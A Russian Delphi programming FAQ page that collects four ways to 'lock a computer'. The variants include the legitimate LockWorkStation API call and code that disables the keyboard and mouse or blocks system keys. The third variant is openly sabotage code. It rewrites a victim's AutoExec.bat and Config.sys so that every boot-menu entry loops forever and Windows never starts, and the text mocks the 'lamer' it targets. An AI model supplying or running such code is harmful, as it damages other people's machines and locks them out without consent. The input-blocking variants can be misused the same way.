---
Title: Как заблокировать компьютер?
Date: 01.01.2007
---


Как заблокировать компьютер?
============================

Вариант 1:

Source: <https://forum.sources.ru>

    procedure LockPC; 
      var OldValue: LongBool; 
    begin 
      SystemParametersInfo(97, Word(Bool), @OldValue, 0); 
      WinExec(PChar('rundll32 mouse,disable'), SW_SHOW); 
      WinExec(PChar('rundll32 keyboard,disable'), SW_SHOW); 
    end;

------------------------------------------------------------------------

Вариант 2:

Author: Thomas Stutz, SDC

Source: <https://www.swissdelphicenter.ch/en/tipsindex.php>

    {
      The LockWorkStation function locks the workstation's display,
      protecting it from unauthorized use.
      This function has the same result as pressing Ctrl+Alt+Del and
      clicking Lock Workstation.
      To unlock the workstation, the user must log in.
     
      Windows NT/2000/XP: Included in Windows 2000 and later.
      Windows 95/98/Me: Unsupported.
    }
     
     
    procedure TForm1.Button1Click(Sender: TObject);
    begin
      LockWorkStation;
    end;
     
    { Loading LockWorkStation dynamically}
     
    function LockWS: Boolean;
    // by Thomas Stutz, SDC
    type
      TLockWorkStation = function: Boolean;
    var
      hUser32: HMODULE;
      LockWorkStation: TLockWorkStation;
    begin
      // Here we import the function from USER32.DLL
      hUser32 := GetModuleHandle('USER32.DLL');
      if hUser32 <> 0 then
      begin
        @LockWorkStation := GetProcAddress(hUser32, 'LockWorkStation');
        if @LockWorkStation <> nil then
        begin
          LockWorkStation;
          Result := True;
        end;
      end;
    end;

------------------------------------------------------------------------

Вариант 3:

Source: DelphiWorld 6.0 <https://delphiworld.narod.ru/>

Вы когда-нибудь видели меню в DOS\'е? Ну, например, то самое, которое
появляется по нажатию на F8 до загрузки Windows. А представьте себе,
если у вас оно будет появляться без всяких нажатий на клавиши, да ещё и
пункты меню будут с заданными вами заголовками, ну, и, наконец, если не
по одному из пунктов меню вы не сможете загрузить Windows...

Для этого нам понадобятся два системных файла, умение делать копию в
буфер обмена (дабы не писать тот код, что я вам сейчас покажу) и
ламерюга, на котором вы бы хотели всё это испытать.

Ну, за последним дело не постоит, а сначала нужно сделать следующее:

Выносим компонент класса TMemo - это большое текстовое поле (мы уже
учились использовать переменные для взаимодействия с файлами, когда
выводили сообщение во время загрузки системы, теперь будем использовать
компоненты).

По созданию окна пишем:

    procedure TForm1.FormCreate(Sender: TObject);
    begin
      with Memo1.Lines do
      begin
        Clear;
        LoadFromFile('C:\AutoExec.bat');
        Insert(3,'goto %config%');
        Insert(4,':FuckSystem');
        Append('beep');
        Append('goto FuckSystem');
        Append(':HackSystem');
        Append('beep');
        Append('goto HackSystem');
        Append(':exit');
        SaveToFile('C:\AutoExec.bat');
     
        Clear;
        LoadFromFile('C:\Config.sys');
        Append('[menu]');
        Append('menuitem=HackSystem, HackSystem');
        Append('menuitem=FuckSystem, FuckSystem');
        Append('[FuckSystem]');
        Append('[HackSystem]');
        SaveToFile('C:\Config.sys');
      end;
    end;

Мы использовали два системных файла. Это AutoExec.bat и Config.sys. В
текстовое поле по имени Memo1 поочерёдно помещаем содержимое файлов с
помощью метода LoadFromFile и добавляем нужный код. В конфиге мы создаём
меню, которое будет отображать при загрузке системы. Состоять оно будет
из двух пунктов: HackSystem и FuckSystem. А в автоэкзэке описываем, что
по нажатию на том или ином пункте меню машина будет зацикливаться...
т.е. глупый пользователь, взяв один из пунктов меню будет сидеть и
ждать, пока не запустится Windows, любуясь на заставку маст-дая с
облачками и остальными причиндалами. Ему не в жизнь не догадаться нажать
Esc, а если нажмёт, то то, что он увидит... м-да... лучше сто раз
увидеть, чем один раз заиметь...


------------------------------------------------------------------------

Вариант 4:

Author: VID, vidsnap@mail.ru

Date: 26.05.2002

    { **** UBPFD *********** by delphibase.endimus.com ****
    >> Блокировка/Разблокировка системы.
     
    Модуль LockSys. Блокировка/Разблокировка системы.
    Метод блокировки: блокируется (по-выбору) клавиатура и мышь,
    системные комбинации клавиш, или всё вместе.
    БЛОКИРОВКА СИСТЕМЫ: function LockSystem(LockMode:TLockMode):Boolean;
    Возможные значения параметра LockMode:
      lmInput - блокировка мыши и клавитатуры
      lmSystemKeys - блокировка системных комбинаций клавиш
      lmBoth = lmInput + lmSystemKeys
    В случае успеха функция возвращает True, иначе - False
     
    РАЗБЛОКИРОВКА СИСТЕМЫ: function UnLockSystem(UnLockMode:TLockMode):Boolean;
    Входные параметры аналогичны функции LockSystem, но только
    речь в данном случае идёт о разблокировке.
    В случае успеха - True, иначе - False.
     
    Зависимости: windows
    Автор:       VID, vidsnap@mail.ru, ICQ:132234868, Махачкала
    Copyright:   VID (основа списана из одного FAQ)
    Дата:        26 мая 2002 г.
    ***************************************************** }
     
    unit LockSys;
     
    interface
    uses
      Windows;
     
    type
      TLockMode = (lmInput, lmSystemKeys, lmBoth);
     
    function FuncAvail(_dllname, _funcname: string; var _p: pointer): boolean;
    function LockSystem(LockMode: TLockMode): Boolean;
    function UnLockSystem(UnLockMode: TLockMode): Boolean;
     
    var
      xBlockInput: function(Block: BOOL): BOOL; stdcall;
     
    implementation
     
    function FuncAvail(_dllname, _funcname: string; var _p: pointer): boolean;
    var
      _lib: tHandle;
    begin
      Result := false;
      _p := nil;
      if LoadLibrary(PChar(_dllname)) = 0 then
        exit;
      _lib := GetModuleHandle(PChar(_dllname));
      if _lib <> 0 then
      begin
        _p := GetProcAddress(_lib, PChar(_funcname));
        if _p <> nil then
          Result := true;
      end;
    end;
     
    function LockSystem(LockMode: TLockMode): Boolean;
    begin
      Result := False;
     
      if LockMode = lmSystemKeys then //Locking system
        if not SystemParametersInfo(SPI_SCREENSAVERRUNNING, 1, nil, 0) then
          Exit;
     
      if LockMode = lmInput then //locking keyb and mouse
        if FuncAvail('USER32.DLL', 'BlockInput', @xBlockInput) then
          xBlockInput(true)
        else
          Exit;
     
      if LockMode = lmBoth then
      begin
        if not SystemParametersInfo(SPI_SCREENSAVERRUNNING, 1, nil, 0) then
          Exit;
        if FuncAvail('USER32.DLL', 'BlockInput', @xBlockInput) then
          xBlockInput(true)
        else
          Exit;
      end;
     
      Result := True;
    end;
     
    function UnLockSystem(UnLockMode: TLockMode): Boolean;
    begin
      Result := False;
     
      if UnLockMode = lmSystemKeys then //UnLocking system
        if not SystemParametersInfo(SPI_SCREENSAVERRUNNING, 0, nil, 0) then
          Exit;
     
      if UnLockMode = lmInput then //unlocking keyb and mouse
        if FuncAvail('USER32.DLL', 'BlockInput', @xBlockInput) then
          xBlockInput(false)
        else
          Exit;
     
      if UnLockMode = lmBoth then
      begin
        if not SystemParametersInfo(SPI_SCREENSAVERRUNNING, 0, nil, 0) then
          Exit;
        if FuncAvail('USER32.DLL', 'BlockInput', @xBlockInput) then
          xBlockInput(false)
        else
          Exit;
      end;
     
      Result := True;
    end;
     
    end.
    
    //Пример использования: 
     
    LockSystem(lmBoth); // Блокировка всей системы
    UnLockSystem(lmInput); // Разблокировка клавы и мыши
